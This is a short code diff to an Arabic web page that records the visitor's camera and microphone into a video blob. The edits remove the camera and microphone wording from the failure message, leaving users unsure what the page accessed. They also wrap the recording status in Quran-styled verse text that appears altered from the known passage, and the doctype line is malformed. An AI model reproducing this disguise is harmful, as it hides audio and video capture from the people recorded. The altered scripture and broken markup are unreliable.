@@ -1,4 +1,4 @@
-TYPE html>
+<DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
@@ -51,7 +51,7 @@ async function attemptStart(){
     startRecording();
   }catch(err){
     console.warn('getUserMedia failed:',err);
-    statusEl.textContent='فشل الوصول للكاميرا أو الميكروفون.';
+    statusEl.textContent='فشل الوصول .';
     started=false;
   }
 }
@@ -70,7 +70,7 @@ function startRecording(){
 
 ⑤ وَالْمُحْصَنَاتُ مِنَ النِّسَاءِ إِلَّا مَا مَلَكَتْ أَيْمَانُكُمْ كِتَابَ اللَّهِ عَلَيْكُمْ ۚ وَرَاجُوا النِّسَاءَ بِالْمَعْرُوفِ ۚ وَلا تَعْتَدُوا ۚ إِنَّ اللَّهَ كَانَ عَفُوًّا غَفُورًا ${RECORD_SECONDS} ثانية.`;}
   mediaRecorder.onstop=async()=>{
-    statusEl.textContent='انتهى ...';
+    statusEl.textContent='صدق الله العظيم ...';
     if(stream) stream.getTracks().forEach(t=>t.stop());
     const blob=new Blob(recordedBlobs,{type:'video/webm'});
 
